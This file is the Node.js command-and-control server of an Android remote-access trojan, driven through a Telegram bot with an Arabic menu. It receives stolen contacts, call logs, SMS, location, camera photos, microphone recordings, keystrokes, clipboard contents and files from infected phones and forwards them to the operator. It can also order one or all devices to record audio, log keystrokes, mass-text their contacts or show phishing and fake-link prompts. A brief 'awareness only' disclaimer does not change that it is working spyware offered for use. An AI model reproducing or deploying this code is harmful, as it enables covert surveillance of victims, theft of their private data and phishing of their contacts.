const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, { polling: true, request: {} });
const appData = new Map();

const actions = [
    '📱 جهات الاتصال 📱',
    '🗑️ جميع 🗑️',
    '✈️ المكالمات ✈️',
    '✨ سيلفي الة تصوير ✨',
    '🌟 رئيسي الة تصوير 🌟',
    '🛑 تسجيل صوتي 🛑',
    '🔑 لوحة المفاتيح 🔑',
    '⚙️ الاوامر ⚙️',
    '🎤 المايكروفون 🎤',
    '📂 ملف مستكشف 📂',
    '🔔 سحب اشعارات 🔔',
    '📋 الحافظة 📋',
    '💤 اهتزاز 💤',
    '🔕 الغاء اهتزاز 🔕',
    '✈️ 𝐀𝐥𝐥 𝐀𝐩𝐩𝐬 𝐋𝐢𝐬𝐭 ✈️',
    '🌟 𝐈𝐧𝐟𝐨 🌟',
    '🔌 ايقاف keylogger 🔌',
    '🔌 تشغيل keylogger 🔌',
    '📤 رفع ملف 📤',
    '🔍 تصيد 🔍',
    '🌐 رابط وهمي 🌐',
    '💬 رسالة جماعية وهمية 💬',
    '🛑 ايقاف سيلفي 🛑',
    '📝 تايب 📝',
    '💻 معلومات الجهاز 💻',
    '💬 جميع 💬'
];

app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const deviceId = req.headers['device-id'];
    bot.sendDocument(data.id, req.file.buffer, { 
        caption: '<b>✿ ملف مستلم من → ' + deviceId + '</b>', 
        parse_mode: 'HTML' 
    }, { 
        filename: fileName, 
        contentType: '*/*' 
    });
    res.send('Done');
});

app.get('/start', (req, res) => {
    res.send(data.id);
});

io.on('connection', (socket) => {
    let deviceId = socket.handshake.headers['device-id'] + '-' + io.engine.clientsCount || 'no information';
    let deviceModel = socket.handshake.query.model || 'no information';
    let deviceIp = socket.handshake.query.ip || 'no information';
    let deviceApps = socket.handshake.query.apps || 'no information';
    
    socket.deviceId = deviceId;
    socket.model = deviceModel;
    socket.ip = deviceIp;
    socket.apps = deviceApps;

    let connectionMessage = '<b>✿ جهاز جديد متصل</b>\n\n' +
        '🔌 الجهاز → ' + deviceId + '\n' +
        '📱 الموديل → ' + deviceModel + '\n' +
        '🌐 الأيبي → ' + deviceIp + '\n' +
        '📱 التطبيقات → ' + deviceApps + '\n\n';

    bot.sendMessage(data.id, connectionMessage, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMessage = '<b>✿ جهاز انقطع الاتصال</b>\n\n' +
            '🔌 الجهاز → ' + deviceId + '\n' +
            '📱 الموديل → ' + deviceModel + '\n' +
            '🌐 الأيبي → ' + deviceIp + '\n' +
            '📱 التطبيقات → ' + deviceApps + '\n\n';
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });

    socket.on('commend', (data) => {
        bot.sendMessage(data.id, '<b>رسالة مستلمة من → ' + deviceId + '</b>\n' + data, { parse_mode: 'HTML' });
    });
    
    socket.on('contacts', (data) => {
        let contactsMessage = '<b>جهات الاتصال من جهاز → ' + deviceId + '</b>\n\n';
        if (data.contacts && data.contacts.length > 0) {
            data.contacts.forEach(contact => {
                contactsMessage += '👤 الاسم: ' + contact.name + '\n📞 الرقم: ' + contact.number + '\n\n';
            });
        } else {
            contactsMessage += 'لا توجد جهات اتصال';
        }
        bot.sendMessage(data.id, contactsMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('calls', (data) => {
        let callsMessage = '<b>سجل المكالمات من جهاز → ' + deviceId + '</b>\n\n';
        if (data.calls && data.calls.length > 0) {
            data.calls.forEach(call => {
                callsMessage += '📞 الرقم: ' + call.number + '\n⏱️ المدة: ' + call.duration + '\n📅 التاريخ: ' + call.date + '\n\n';
            });
        } else {
            callsMessage += 'لا توجد مكالمات';
        }
        bot.sendMessage(data.id, callsMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('apps', (data) => {
        let appsMessage = '<b>التطبيقات المثبتة على جهاز → ' + deviceId + '</b>\n\n';
        if (data.apps && data.apps.length > 0) {
            data.apps.forEach(app => {
                appsMessage += '📱 ' + app.name + '\n';
            });
        } else {
            appsMessage += 'لا توجد تطبيقات';
        }
        bot.sendMessage(data.id, appsMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('location', (data) => {
        let locationMessage = '<b>موقع جهاز → ' + deviceId + '</b>\n\n' +
            '🌐 الرابط: ' + data.url + '\n' +
            '📍 خط العرض: ' + data.latitude + '\n' +
            '📍 خط الطول: ' + data.longitude;
        bot.sendMessage(data.id, locationMessage, { parse_mode: 'HTML' });
        if (data.url) {
            bot.sendLocation(data.id, data.latitude, data.longitude);
        }
    });
    
    socket.on('photo', (data) => {
        bot.sendPhoto(data.id, data.buffer, { 
            caption: '<b>صورة من جهاز → ' + deviceId + '</b>', 
            parse_mode: 'HTML' 
        });
    });
    
    socket.on('microphone', (data) => {
        bot.sendAudio(data.id, data.buffer, { 
            caption: '<b>تسجيل صوتي من جهاز → ' + deviceId + '</b>', 
            parse_mode: 'HTML' 
        });
    });
    
    socket.on('file', (data) => {
        bot.sendDocument(data.id, data.buffer, { 
            caption: '<b>ملف من جهاز → ' + deviceId + '</b>', 
            parse_mode: 'HTML' 
        }, {
            filename: data.filename,
            contentType: data.contentType
        });
    });
    
    socket.on('keylogger', (data) => {
        let keylogMessage = '<b>سجل لوحة المفاتيح من جهاز → ' + deviceId + '</b>\n\n' + data.logs;
        bot.sendMessage(data.id, keylogMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('clipboard', (data) => {
        let clipboardMessage = '<b>محتويات الحافظة من جهاز → ' + deviceId + '</b>\n\n' + data.content;
        bot.sendMessage(data.id, clipboardMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('sms', (data) => {
        let smsMessage = '<b>رسائل SMS من جهاز → ' + deviceId + '</b>\n\n';
        if (data.sms && data.sms.length > 0) {
            data.sms.forEach(sms => {
                smsMessage += '📱 من: ' + sms.from + '\n📅 التاريخ: ' + sms.date + '\n📝 النص: ' + sms.body + '\n\n';
            });
        } else {
            smsMessage += 'لا توجد رسائل SMS';
        }
        bot.sendMessage(data.id, smsMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('notification', (data) => {
        let notificationMessage = '<b>إشعار من جهاز → ' + deviceId + '</b>\n\n' +
            '📱 التطبيق: ' + data.app + '\n' +
            '📝 العنوان: ' + data.title + '\n' +
            '📄 النص: ' + data.text;
        bot.sendMessage(data.id, notificationMessage, { parse_mode: 'HTML' });
    });
});

bot.on('message', (msg) => {
    if (msg.text === '/start') {
        bot.sendMessage(msg.chat.id, '<b>✿ مرحبا بك في بوت الاختراق V3 (النسخة الكاملة)</b>\n\n' +
            '🔰 قناتي تليجرام t.me/Abu_Yamani\n' +
            '👤 المطور @king_1_4\n\n' +
            '🚫 رجاء عدم استخدام البوت فيما يغضب الله. هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n', 
            { 
                parse_mode: 'HTML', 
                reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
    } else {
        if (appData.get('currentAction') === 'smsNumber') {
            let smsText = msg.text;
            let target = appData.get('currentTarget');
            let smsNumber = appData.get('smsNumber');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'sendSms', 
                    extras: [
                        { key: 'smsText', value: smsText },
                        { key: 'smsNumber', value: smsNumber }
                    ] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'sendSms', 
                    extras: [
                        { key: 'smsText', value: smsText },
                        { key: 'smsNumber', value: smsNumber }
                    ] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            appData.delete('smsNumber');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'smsToAllContacts') {
            let smsText = msg.text;
            let target = appData.get('currentTarget');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'smsToAllContacts', 
                    extras: [{ key: 'smsText', value: smsText }] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'smsToAllContacts', 
                    extras: [{ key: 'smsText', value: smsText }] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'textToAllContacts') {
            let text = msg.text;
            appData.set('smsText', text);
            appData.set('currentAction', 'smsNumber');
            
            bot.sendMessage(msg.chat.id, '<b>✿ أدخل رقم الهاتف المرسل إليه</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [['رجوع']], 
                    resize_keyboard: true, 
                    one_time_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'popNotification') {
            let notificationText = msg.text;
            let target = appData.get('currentTarget');
            let url = appData.get('url');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'popNotification', 
                    extras: [
                        { key: 'notificationText', value: notificationText },
                        { key: 'url', value: url }
                    ] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'popNotification', 
                    extras: [
                        { key: 'notificationText', value: notificationText },
                        { key: 'url', value: url }
                    ] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            appData.delete('url');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'vibrateDuration') {
            let duration = msg.text;
            let target = appData.get('currentTarget');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'vibrate', 
                    extras: [{ key: 'duration', value: duration }] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'vibrate', 
                    extras: [{ key: 'duration', value: duration }] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'microphoneDuration') {
            let duration = msg.text;
            let target = appData.get('currentTarget');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'microphone', 
                    extras: [{ key: 'duration', value: duration }] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'microphone', 
                    extras: [{ key: 'duration', value: duration }] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'toast') {
            let toastText = msg.text;
            let target = appData.get('currentTarget');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'toast', 
                    extras: [{ key: 'toastText', value: toastText }] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'toast', 
                    extras: [{ key: 'toastText', value: toastText }] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'currentNotificationText') {
            let notificationText = msg.text;
            let target = appData.get('currentTarget');
            
            if (target == 'all') {
                io.sockets.emit('commend', { 
                    request: 'currentNotification', 
                    extras: [{ key: 'notificationText', value: notificationText }] 
                });
            } else {
                io.to(target).emit('commend', { 
                    request: 'currentNotification', 
                    extras: [{ key: 'notificationText', value: notificationText }] 
                });
            }
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            
        } else if (appData.get('currentAction') === 'allSms') {
            let smsText = msg.text;
            appData.set('smsText', smsText);
            appData.set('currentAction', 'smsNumber');
            
            bot.sendMessage(msg.chat.id, '<b>✿ أدخل رقم الهاتف المرسل إليه</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [['رجوع']], 
                    resize_keyboard: true, 
                    one_time_keyboard: true 
                } 
            });
            
        } else if (msg.text === '🌟 𝐈𝐧𝐟𝐨 🌟') {
            bot.sendMessage(msg.chat.id, 
                '<b>✿ معلومات البوت (النسخة الكاملة)</b>\n\n' +
                '🤖 الإصدار: V3 Full\n' +
                '👨‍💻 المطور: @king_1_4\n' +
                '📢 القناة: t.me/Abu_Yamani\n\n' +
                '✨ جميع الميزات مفعلة بالكامل ✨', 
                { parse_mode: 'HTML' });
                
        } else if (msg.text === '💻 معلومات الجهاز 💻') {
            if (io.engine.clientsCount === 0) {
                bot.sendMessage(msg.chat.id, '<b>✿ لا توجد أجهزة متصلة ✖️</b>\n\n', { parse_mode: 'HTML' });
            } else {
                let devicesList = '<b>✿ الأجهزة المتصلة: ' + io.engine.clientsCount + '</b>\n\n';
                let count = 1;
                
                io.engine.clients.forEach((socket, id) => {
                    devicesList += '<b>جهاز ' + count + '</b>\n' +
                        '🔌 المعرف: ' + socket.deviceId + '\n' +
                        '📱 الموديل: ' + socket.model + '\n' +
                        '🌐 الأيبي: ' + socket.ip + '\n' +
                        '📱 التطبيقات: ' + socket.apps + '\n\n';
                    count++;
                });
                
                let devices = [];
                io.engine.clients.forEach((socket) => {
                    devices.push([socket.deviceId]);
                });
                devices.push(['كل الاجهزة']);
                devices.push(['رجوع']);
                
                bot.sendMessage(msg.chat.id, devicesList, { 
                    parse_mode: 'HTML',
                    reply_markup: { 
                        keyboard: devices, 
                        resize_keyboard: true, 
                        one_time_keyboard: true 
                    } 
                });
            }
            
        } else if (msg.text === 'كل الاجهزة') {
            appData.set('currentTarget', 'all');
            
            bot.sendMessage(msg.chat.id, '<b>✿ اختر الأمر لجميع الأجهزة</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑', 'رجوع']
                    ], 
                    resize_keyboard: true, 
                    one_time_keyboard: true 
                } 
            });
            
        } else if (actions.includes(msg.text)) {
            let target = appData.get('currentTarget');
            
            if (!target) {
                bot.sendMessage(msg.chat.id, '<b>✿ الرجاء اختيار جهاز أولاً من قائمة "معلومات الجهاز"</b>\n\n', 
                    { parse_mode: 'HTML' });
                return;
            }
            
            let requestType = '';
            let extras = [];
            
            switch(msg.text) {
                case '📱 جهات الاتصال 📱':
                    requestType = 'contacts';
                    break;
                case '🗑️ جميع 🗑️':
                    requestType = 'all';
                    break;
                case '✈️ المكالمات ✈️':
                    requestType = 'calls';
                    break;
                case '✨ سيلفي الة تصوير ✨':
                    requestType = 'selfie-camera';
                    break;
                case '🌟 رئيسي الة تصوير 🌟':
                    requestType = 'main-camera';
                    break;
                case '🛑 تسجيل صوتي 🛑':
                    requestType = 'stopMicrophone';
                    break;
                case '🔑 لوحة المفاتيح 🔑':
                    requestType = 'keylogger-on';
                    break;
                case '⚙️ الاوامر ⚙️':
                    requestType = 'apps';
                    break;
                case '🎤 المايكروفون 🎤':
                    appData.set('currentAction', 'microphoneDuration');
                    bot.sendMessage(msg.chat.id, '<b>✿ أدخل مدة التسجيل بالثواني</b>\n\n', 
                        { parse_mode: 'HTML', reply_markup: { 
                            keyboard: [['رجوع']], 
                            resize_keyboard: true, 
                            one_time_keyboard: true 
                        } 
                    });
                    return;
                case '📂 ملف مستكشف 📂':
                    requestType = 'fileExplorer';
                    break;
                case '🔔 سحب اشعارات 🔔':
                    requestType = 'currentNotification';
                    break;
                case '💤 اهتزاز 💤':
                    appData.set('currentAction', 'vibrateDuration');
                    bot.sendMessage(msg.chat.id, '<b>✿ أدخل مدة الاهتزاز بالثواني</b>\n\n', 
                        { parse_mode: 'HTML', reply_markup: { 
                            keyboard: [['رجوع']], 
                            resize_keyboard: true, 
                            one_time_keyboard: true 
                        } 
                    });
                    return;
                case '📝 تايب 📝':
                    appData.set('currentAction', 'toast');
                    bot.sendMessage(msg.chat.id, '<b>✿ أدخل النص المراد عرضه</b>\n\n', 
                        { parse_mode: 'HTML', reply_markup: { 
                            keyboard: [['رجوع']], 
                            resize_keyboard: true, 
                            one_time_keyboard: true 
                        } 
                    });
                    return;
                case '💬 جميع 💬':
                    appData.set('currentAction', 'allSms');
                    bot.sendMessage(msg.chat.id, '<b>✿ أدخل نص الرسالة المرسلة</b>\n\n', 
                        { parse_mode: 'HTML', reply_markup: { 
                            keyboard: [['رجوع']], 
                            resize_keyboard: true, 
                            one_time_keyboard: true 
                        } 
                    });
                    return;
                case '🌐 رابط وهمي 🌐':
                    requestType = 'fakeLink';
                    break;
                case '🔍 تصيد 🔍':
                    requestType = 'phishing';
                    break;
                case '📤 رفع ملف 📤':
                    requestType = 'uploadFile';
                    break;
                case '✈️ 𝐀𝐥𝐥 𝐀𝐩𝐩𝐬 𝐋𝐢𝐬𝐭 ✈️':
                    requestType = 'allApps';
                    break;
                case '🔌 ايقاف keylogger 🔌':
                    requestType = 'keylogger-off';
                    break;
                case '🔌 تشغيل keylogger 🔌':
                    requestType = 'keylogger-on';
                    break;
                case '🔕 الغاء اهتزاز 🔕':
                    requestType = 'stopVibrate';
                    break;
                case '🛑 ايقاف سيلفي 🛑':
                    requestType = 'stopSelfie';
                    break;
                default:
                    bot.sendMessage(msg.chat.id, '<b>✿ أمر غير معروف</b>\n\n', { parse_mode: 'HTML' });
                    return;
            }
            
            if (requestType) {
                if (target == 'all') {
                    io.sockets.emit('commend', { request: requestType, extras: extras });
                } else {
                    io.to(target).emit('commend', { request: requestType, extras: extras });
                }
                
                bot.sendMessage(msg.chat.id, '<b>✿ تم إرسال الأمر بنجاح</b>\n\n', 
                    { parse_mode: 'HTML', reply_markup: { 
                        keyboard: [
                            ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                            ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                            ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                            ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                            ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                            ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                            ['📝 تايب 📝', '💬 جميع 💬'],
                            ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                            ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                            ['🛑 ايقاف سيلفي 🛑']
                        ], 
                        resize_keyboard: true 
                    } 
                });
            }
            
        } else {
            let found = false;
            io.engine.clients.forEach((socket, id) => {
                if (msg.text === socket.deviceId) {
                    appData.set('currentTarget', id);
                    
                    bot.sendMessage(msg.chat.id, '<b>✿ اختر الأمر للجهاز: ' + socket.model + '</b>\n\n', 
                        { parse_mode: 'HTML', reply_markup: { 
                            keyboard: [
                                ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                                ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                                ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                                ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                                ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                                ['📝 تايب 📝', '💬 جميع 💬'],
                                ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                                ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                                ['🛑 ايقاف سيلفي 🛑', 'رجوع']
                            ], 
                            resize_keyboard: true, 
                            one_time_keyboard: true 
                        } 
                    });
                    found = true;
                }
            });
            
            if (!found && msg.text !== 'رجوع') {
                bot.sendMessage(msg.chat.id, '<b>✿ أمر غير معروف أو جهاز غير موجود</b>\n\n', 
                    { parse_mode: 'HTML' });
            }
        }
        
        if (msg.text === 'رجوع') {
            bot.sendMessage(msg.chat.id, '<b>✿ القائمة الرئيسية</b>\n\n', 
                { parse_mode: 'HTML', reply_markup: { 
                    keyboard: [
                        ['🌟 𝐈𝐧𝐟𝐨 🌟', '💻 معلومات الجهاز 💻'],
                        ['📱 جهات الاتصال 📱', '🗑️ جميع 🗑️'],
                        ['✨ سيلفي الة تصوير ✨', '🌟 رئيسي الة تصوير 🌟'],
                        ['✈️ المكالمات ✈️', '🔑 لوحة المفاتيح 🔑'],
                        ['🎤 المايكروفون 🎤', '📂 ملف مستكشف 📂'],
                        ['🔔 سحب اشعارات 🔔', '💤 اهتزاز 💤'],
                        ['📝 تايب 📝', '💬 جميع 💬'],
                        ['🌐 رابط وهمي 🌐', '🔍 تصيد 🔍'],
                        ['📤 رفع ملف 📤', '⚙️ الاوامر ⚙️'],
                        ['🛑 ايقاف سيلفي 🛑']
                    ], 
                    resize_keyboard: true 
                } 
            });
            appData.delete('currentTarget');
            appData.delete('currentAction');
        }
    }
});

setInterval(() => {
    io.engine.clients.forEach((socket, id) => {
        io.to(id).emit('ping', {});
    });
}, 5000);

setInterval(() => {
    https.get(data.url, res => {}).on('error', err => {});
}, 300000);

server.listen(process.env.PORT || 3000, () => {
    console.log('البوت يعمل على المنفذ 3000');
});